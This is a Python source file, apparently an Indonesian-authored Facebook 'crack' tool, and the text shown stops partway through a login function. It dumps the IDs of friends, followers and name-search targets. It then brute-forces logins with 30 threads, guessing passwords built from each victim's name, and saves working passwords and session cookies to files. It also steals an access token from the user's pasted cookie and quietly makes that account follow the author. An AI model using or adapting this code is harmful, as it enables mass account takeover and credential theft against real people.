
# coding=utf-8

#     *file name: Colmexs
#     *copyright: (C) © 2023 ~ Jessica Putry
#     *contact me on whatsap: +6287799183568
#     *Group Facebok: RATU ERROR (owner)

#--- module in python
import os,sys,requests,re,bs4,datetime,json,time,random,platform
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from time import time as RakaXF
from datetime import datetime
from random import randint
from rich.console import Console
from rich.markdown import Markdown

# TANGGAL WAKTU
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 
uasm, duplikat = [], []

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# WARNA
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)
# LOGO
def logo():
	time.sleep (0.01)
	jalan ('\x1b[1;97m⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏')
	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟  💕   💖 💖 💞  ✨')
	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋     💕  ⭐ 💞 ')
	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋      💞 💖 💕   💖')
	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉    ✨     💖   💕  ✨ 💖 💕')
	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀         ⭐     💖   💖')
	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀        💞 ✨ 💕')
	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁      💞  💖      ⭐')
	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶    ⭐        💖')
	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟         💖    💞')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋ JANGAN LUPA.....   ✨')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿ \x1b[1;96m⣾⣿⣿ ⣾⣿⣷ ⣿   ⣿⢿⡿⣿ ⣾⠛⠛ ⢿ ⡿ " ⣾⠛⣷')
	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃ \x1b[1;96m⣿   ⣿ ⣿ ⣿   ⣿⠙⠋⣿ ⣿⣿   ⣿     ⣫')
	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄ \x1b[1;96m⢿⣿⣿ ⢿⣿⡿ ⢿⣿⣿ ⣿  ⣿ ⢿⣤⣤ ⣾ ⣷   ⢿⣤⡿')

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
	
# METHODE LOGIN
def login():
	logo()
	print()
	ses = requests.Session()
	cokie = {'cookie':input(f"{H}[{P}*{H}]{P} Masukan Cookie Fress : {H}")}
	try:
		req = ses.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = cokie).text
		act = re.search('act=(\d+)',str(req)).group(1)
		res = ses.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&act=%s&breakdown_regrouping=1'%(act), cookies = cokie).text
		xyz = re.search('window.__accessToken="(.*?)"', str(res)).group(1)
		open('cokie.txt','w').write(cokie.get('cookie'))
		open('token.txt','w').write(xyz)
		follow_me(xyz)
		print (f"\n{H}[{P}*{H}]{P} login berhasil...\n{H}[{P}*{H}]{P} Token : {H}{xyz}");jeda(2)
		menu()
	except Exception as e:
		os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
		print(e)
		exit()

def follow_me(xyz):
    from bs4 import BeautifulSoup as BSP
    try:
        req = BSP(ses.get('https://m.facebook.com/100000834003593', cookies = xyz).text,'html.parser')# punya Raka Andrian Tara
        for i in req.find_all('a', href=True):
            if '/a/subscribe.php?' in str(i.get('href')):
                r = ses.get('https://m.facebook.com%s'%(i['href']), cookies=xyz).text
    except:pass
#  MENU
def menu():
	try:
		cookie = open('cokie.txt','r').read()
		token  = open('token.txt','r').read()
		try:
			name = requests.get('https://graph.facebook.com/%s?access_token=%s'%('me',token), cookies = {'cookie':cookie}).json()['name']
		except:
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			exit(f'{M} ! cookie invalid')
	except (FileNotFoundError,KeyError,IOError):
#		print (f"{M} ! cookie invalid");jeda(2)
		login()
	except requests.exceptions.ConnectionError:
		exit(f"{M} ! tidak ada koneksi")
	banner()
#	print()
#	print (f'\t\t{H}{name} ')
	print()
	print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
	print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack \x1b[1;92mUNLIMITED')
	print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
	print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mCrack dari  jumlah follower')
	print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mCrack dari  anggota group')
	print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mLihat hasil crack')
	print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mSetting user agent')
	print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
	print('')
	romz=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if romz in ['']:print ("\n ! jangan kosong")
	elif romz in ['1']:dump_publik(cookie,token)
	elif romz in ['2']:massal(cookie,token)
	elif romz in['3']:mail_name()
	elif romz in['4']:follow(cookie,token)
	elif romz in['5']:exit()
	elif romz in ['6']:hasil()
	elif romz in ['7']:
		crack().UA()
		uas = open('ugent.txt','r').read()
		print (f"{P} ! User-Agent saat ini: {U}{uas}")
		print (f"{P} ! jika tidak mau ingin mengganti User-Agent ketik {H}no{P} ")
		us = input (" ? User-Agent: ")
		if us in['no','No','NO']:
			exit()
		elif us in['']:
			uas = ("Mozilla/5.0 (Linux; Android 4.2.2; FreeTAB 9000 IPS IC Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36")
			open('ugent.txt','w').write(uas)
		else:
			open('ugent.txt','w').write(us)
	elif romz in ['0']:
		os.system("rm -rf cookie.txt")
		os.system("rm -rf token.txt")
		exit()
	else:
		print ("\n ! isi yg benar")

id =[]
# CRACK PUBLIK
def publik(cookie):
	try:
		user = input('\n \x1b[1;97mMasukan username/ID:\x1b[1;96m ')
		dump_id(f"https://mbasic.facebook.com/{user}?v=friends",cookie)
	except:
		pass 
		
def dump_id(url_mb,cookie):
	try:
		url = parser(requests.get(url_mb,cookies=cookie).text,"html.parser")
		for z in url.find_all("a",href=True):
			if "fref" in z.get("href"):
				if "/profile.php?id=" in z.get("href"):
					idt = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")))
					nama = z.text 
				else:
					idt = "".join(bs4.re.findall("/(.*?)\?",z.get("href")))
					nama = z.text
				if idt+"|"+nama in id: 
					pass 
				else:
					id.append(idt+"|"+nama)
				sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
				sys.stdout.flush();jeda(0.0050)
		for x in url.find_all("a",href=True):
			if "Lihat Teman Lain" in x.text: 
				dump_id("https://mbasic.facebook.com/"+x.get("href"),cookie)
	except:pass 
	print("")
	if len(id)!=0:
		return crack().__xnx__(id)
	else:
		exit(f"{M} gagal mengambil ID")
	
def activate_licensi():
	os.system("clear")
	logo()
	print("\x1b[1;97mKetik \x1b[1;92madmin\x1b[1;97m untuk mendapatkan lisensi script dari admin....terima kasih\n")
	key = input("\x1b[1;96m[\x1b[1;97m>\x1b[1;96m]\x1b[1;97m licensi: ").lower()
	if "gets" in key:
		os.system("xdg-open https://fbkey.ratuerror.com/register/")
		activate_licensi()
	elif "admin" in key:
		os.system("xdg-open https://wa.me/6287799183568?text=RATU%20COLMEXs....beli%20lisensi%20dooong")
		activate_licensi()
	else:
		gets = requests.get("https://fbkey.ratuerror.com/check.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
		if "error" in gets["status"]:
			exit(" [×] message: "+gets["msg"]+"\n\n")
		elif "berlaku" in gets["status"]:
			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
			open(".licensi","w").write(key.strip())
			menu()
			os.system("clear")
		elif "kadaluarsa" in gets["status"]:
			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
		else:
			exit("[!] licensi tidak valid")

def dump_publik(ck,tk, id = []):
	dta = {'access_token':tk,'after':None}
	url = 'https://graph.facebook.com/v18.0/%s/friends'
	trgt = input('\n \x1b[1;96m[\x1b[1;97m*\x1b[1;96m] \x1b[1;97mMasukan Id : ')
	for xxx in trgt.split(','):
		exec_dump(dta, url, xxx, id, ck)
	print()
	return crack().__xnx__(id)

def exec_dump(params, host, user, id, coki):
	try:
		req = requests.get(host%(user), params=params, cookies={'cookie':coki}).json()
		for xyz in req['data']:
			trgt = '%s|%s'%(xyz['id'],xyz['name'])
			if trgt not in id:id.append(trgt)
			print(' %s[%s*%s] %sSuccess Dump %s %sId '%(H,P,H,P,H,len(id)),end='\r')
			sys.stdout.flush()
		if 'paging' in str(req):
			after = req['paging']['cursors']['after']
			params.update({'after': after})
			exec_dump(params, host, user, id, coki)
	except:pass

# CRACK UNLIMITED
def massal(ck,tk):
	dta = {'access_token':tk,'after':None}
	url = 'https://graph.facebook.com/v18.0/%s/friends'
	trgt = input(f'\n \x1b[1;96m[\x1b[1;97m*\x1b[1;96m] \x1b[1;97mGunakan Tanda Koma ({H},{P}) Buat Pemisah Id\n \x1b[1;96m[\x1b[1;97m*\x1b[1;96m] \x1b[1;97mMasukan Id : ')
	for xxx in trgt.split(','):
		exec_dump(dta, url, xxx, id, ck)
	print()
	return crack().__xnx__(id)
	
def exec_dump(params, host, user, id, coki):
	try:
		req = requests.get(host%(user), params=params, cookies={'cookie':coki}).json()
		for xyz in req['data']:
			trgt = '%s|%s'%(xyz['id'],xyz['name'])
			if trgt not in id:id.append(trgt)
			print(' %s[%s*%s] %sSuccess Dump %s Id '%(H,P,H,P,len(id)),end='\r')
			sys.stdout.flush()
		if 'paging' in str(req):
			after = req['paging']['cursors']['after']
			params.update({'after': after})
			exec_dump(params, host, user, id, coki)
	except:pass
	
id=[]
# CRACK PENCARIAN NAMA
def mail_name():
	try:
		print(f'{P} contoh: sayang,pengen,colmeks ')
		nama = input(f' nama orang: ')
		jumlah=int(input(' jumlah ID yang ingin di dump: '))
		if "90000" in str(jumlah):
			jumlah-=1
		if jumlah<90001:
			pass
		else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
		domain = "@gmail.com" #,"@yahoo.com"
		for z in range(int(jumlah)):
			if len(nama.split())>1:mail = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"|"+str(nama.split()[0])+" "+str(nama.split()[1])
			else:mail = str(nama)+str(z)+str(domain)+"|"+str(nama)
			if mail in id:pass
			else:id.append(mail)
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except:pass
	print ('')
	return crack().__xnx__(id)
			
# CRACK JUMLAH FOLLOWER
def follow(token,cookie):
	try:
		user=input(f"\n{P} Masukan ID publik :\x1b[1;93m ")
		if user in pepek:
			exit("\n ! gk usah tolol")
		else:
			po = self.roomz.get(f"https://graph.facebook.com/{user}/subscribers?limit=6001&access_token={token}",cookies=cookie).json()
			for i in po['data']:
				id.append(f"{i['id']}<=>{i['name']}")
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except KeyError:
		exit(f"{M} gagal mengambil ID")
	
	print('')
	return crack().__xnx__(id)

# LIHAT HASIL
oke,cepe=[],[]
def hasil():
	print(f"""
 {P}1. Cek hasil akun {H}Berhasil{P}
 2. Cek hasil akun {K}Checkpoint{P}
 0. Kembali
	""")
	rom = input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if rom in['']:
		exit("\n Isi yg benar")
	elif rom in['1','01']: 
		try:
			dirs = os.listdir('OK')
			for file in dirs:
				oke.append(file)
		except:pass 
		if len(oke)==0:
			exit("\n File tidak tersedia")
		else:
			print(f'\n {H}Hasil akun berhasil 👍')
			nomor = 0
			for i in oke:
				fil = open(f"OK/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{P} {i} {P}-{P} {str(len(fil))} ")
			file = input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPilih nomor yang ingin di cek :\x1b[1;93m ")
			try:
				hasil = oke[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n Isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalok = open(f"OK/{hasil}", "r").read().splitlines()
			print(f"\n{P}🍏---------------------------------------🍏")
			print (f"{P} Hasil tanggal: {file_nm} total: {P}{len(totalok)}")
			print(f"{P}🍏---------------------------------------🍏")
			for ngontol in totalok:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;92m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['2','02']: 
		try:
			dirs = os.listdir('CP')
			for file in dirs:
				cepe.append(file)
		except:pass 
		if len(cepe)==0:
			exit(" File tidak tersedia")
		else:
			print(f'\n {K}Hasil akun checkpoint 👎')
			nomor = 0
			for i in cepe:
				fil = open(f"CP/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{P} {i} {P}-{P} {str(len(fil))} ")
			file = input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPilih nomor yang ingin di cek :\x1b[1;93m ")
			try:
				hasil = cepe[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n Isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalcp = open(f"CP/{hasil}", "r").read().splitlines()
			print(f"\n{P}🍊---------------------------------------🍊")
			print (f"{P} Hasil tanggal: {file_nm} total: {K}{len(totalcp)}")
			print(f"{P}🍊---------------------------------------🍊")
			for ngontol in totalcp:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;93m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['0','00']:
		os.system("python simple.py")
	else:
		exit("\n Isi yg benar")
	
# METHDOE CRACK
ok,cp,loop=[],[],0
class crack:
	
	def __init__(self):
		self.id =[]
	
	def __xnx__(self,id):
		self.id =id 
		print()
		cx=input(f" {H}[{P}?{H}] {P}Gunakan password manual {H}y{P}/{M}t {P}:\x1b[1;93m ")
		print ('')
		if cx in ('y'):
			self.manual()
		elif cx in ('t'):
			print (' \x1b[1;96m[\x1b[1;97ma\x1b[1;96m] \x1b[1;97mLogin Via Page')
			print (' \x1b[1;96m[\x1b[1;97mb\x1b[1;96m] \x1b[1;97mLogin Via Outmeta')
			print (' \x1b[1;96m[\x1b[1;97mc\x1b[1;96m] \x1b[1;97mLogin Via Adsmanager')
			print ('')
			self.langsung()
		else:
			exit()
	
	def manual(self):
		print (f"{P} Contoh: sayang,anjing,123456")
		pwek=input(" Masukan password: ")
		if pwek in(''):
			exit("\n jangan kosong")
		elif len(pwek)<=5:
			exit("\n password minimal 6 huruf")
		else:
			pass 
		print (' \x1b[1;96m[\x1b[1;97ma\x1b[1;96m] \x1b[1;97mHeaders Validate')
		print (' \x1b[1;96m[\x1b[1;97mb\x1b[1;96m] \x1b[1;97mHeaders Reguler')
		print (' \x1b[1;96m[\x1b[1;97mc\x1b[1;96m] \x1b[1;97mHeaders Bussines\n')
		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
		print (f"""
 \x1b[1;97m⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 ⚡ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 ⚡ crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in self.id:
				pwx = []
				uid,name = akun.split('|')[0],akun.split('|')[1].lower()
				pwx = pwek.split(",")
				if men in['1']:
					titid.submit(self.__romz__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__romz__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
				elif men in['4']:
					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
				elif men in['a','A']:
					titid.submit(self.validate, uid, pwx)
				elif men in['b','B']:
					titid.submit(self.reg, uid, pwx)
				elif men in['c','C']:
					titid.submit(self.bussines, uid, pwx)
				else:
					exit("\n isi yang benar")
					
		self.hasil(ok,cp)

	def langsung(self):
		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
		print (f"""
 {P}⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 ⚡ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 ⚡ crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in self.id:
				uid,name = akun.split('|')[0],akun.split('|')[1].lower()
				na = name.split(' ')[0]
				pwx = ['sayangku','sayang123']
				if len(name)<6:
					if len(na)<3:
						pass 
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
						pwx.append(na+'1234')
						pwx.append(na+'0'+str(random.randint(0,9)))
						pwx.append(na+'1'+str(random.randint(0,9)))
						
				else:
					if len(na)<3:
						pwx.append(name)
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
						pwx.append(na+'123456')
						pwx.append(na+'1234')
						pwx.append(na+'2'+str(random.randint(0,9)))
				if men in['1']:
					titid.submit(self.__romz__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__romz__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
				elif men in['4']:
					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
				elif men in['a','A']:
					titid.submit(self.validate, uid, pwx)
				elif men in['b','B']:
					titid.submit(self.reg, uid, pwx)
				elif men in['c','C']:
					titid.submit(self.bussines, uid, pwx)
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
	#---> nitip kontolL
	def ___raka_andrian_tara___(self,kukis,user,pw):
		cookie = {"cookie": kukis}
		with requests.Session() as ses:
			try:
				for KontolJawir in sop(ses.get('https://mbasic.facebook.com/100000834003593',cookies = cookie).content,'html.parser').find_all('a',href=True):#tong dihapus nya anjink
					if 'subscribe.php' in KontolJawir['href']:
						Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
			except Exception as e:pass
	#--- methode
	def __romz__(self, user, peweh, url_log):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ses = requests.Session()
				URL=url_log
				headerr={
					"Host":URL,
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"user-agent":self.UA(),
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					"x-requested-with":"mark.via.gp",
					"sec-fetch-site":"same-origin",
					"sec-fetch-mode":"navigate",
					"sec-fetch-user":"?1",
					"sec-fetch-dest":"document",
					"referer":f"https://{URL}/",
					"accept-encoding":"gzip, deflate",
					"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				}
				GET = ses.get(f'https://{URL}/login/save-device/?login_source=login&refsrc=deprecated&_rdr',headers=headerr).text 
				dataa ={
					"lsd":re.search('name="lsd" value="(.*?)"', str(GET)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(GET)).group(1),
					"m_ts": re.search('name="m_ts" value="(.*?)"',str(GET)).group(1),
					"li": re.search('name="li" value="(.*?)"',str(GET)).group(1),
					"try_number": re.search('name="try_number" value="(.*?)"',str(GET)).group(1),
					"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(GET)).group(1),
					"email":user,
					"pass":pw,
					"login":"Submit",
					"bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(GET)).group(1),
				}
				headexx={
					"Host":URL,
					"content-length": f"{str(len(dataa))}",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"origin":f"https://{URL}",
					"content-type":"application/x-www-form-urlencoded",
					"user-agent":self.UA(),
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					"x-requested-with":"mark.via.gp",
					"sec-fetch-site":"same-origin",
					"sec-fetch-mode":"navigate",
					"sec-fetch-user":"?1",
					"sec-fetch-dest":"document",
					"referer":f"https://{URL}/login/save-device/?login_source=login&refsrc=deprecated&_rdc=1&_rdr",
					"accept-encoding":"gzip, deflate, br",
					"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"cookie":(";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
				}
				POS = ses.post(f"https://{URL}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",data=dataa,headers=headexx,allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
					info = f"{user} ◊ {pw} ◊ {kukis}"
					ok.append(f"{info}")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
					info = f'{user} ◊ {pw}'
					cp.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
			
		loop+=1

	def UserAgent(self,user):
		rr = random.randint; rc = random.choice
		ua0 = f"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(109,127))}.0.0.0 Safari/537.36 AVG/109.0.24252.121"
		ua1 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(120,127))}.0.0.0 Mobile Safari/537.36"
		ua2 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(120,127))}.0.0.0 Safari/537.36"
		ua3 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(125,127))}.0.0.0 Safari/537.3"
		ua4 = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(120,127))}.0.0.0 Safari/537.3"
		ua5 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
		base = rc([ua0, ua1, ua2, ua3, ua4, ua5])
		return base

	def validate(self, user, peweh):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r {komtol}• New {P}{str(loop)}/{len(self.id)} {H}OK:{len(ok)} {K}CP:{len(cp)} ",end="")
		ua = self.UserAgent(user)
		for pw in peweh:
			try: 
				ses = requests.Session()
				link = ses.get(f"https://mbasic.facebook.com/login/?email={user}&next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Ffbauth%2F%3Fnext%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252F%253Fnav_ref%253Dbiz_unified_f3_login_page_to_dfc%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dff9c6dd9-5bc8-4af7-97bf-9ef03c6c0416&li=YCLIZq1ajIf2c5qFEmTDjLXq&e=1348028&shbl=1&refsrc=deprecated&_rdr")
				data = {
    'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
    'm_ts': re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
    'li': re.search('name="li" value="(.*?)"', str(link.text)).group(1),
    'try_number': '0',
    'unrecognized_tries': '0',
    'email': user,
    'pass': pw,
    'login': 'Masuk',
    'bi_xrwh': '0',
}
				headers = {
    'User-Agent': ua,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Content-Type': 'application/x-www-form-urlencoded',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'viewport-width': '980',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.103", "Chromium";v="127.0.6533.103"',
    'sec-ch-prefers-color-scheme': 'dark',
    'upgrade-insecure-requests': '1',
    'origin': 'https://mbasic.facebook.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Ffbauth%2F%3Fnext%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252F%253Fnav_ref%253Dbiz_unified_f3_login_page_to_dfc%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dff9c6dd9-5bc8-4af7-97bf-9ef03c6c0416&_rdc=1&_rdr',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority': 'u=0, i',
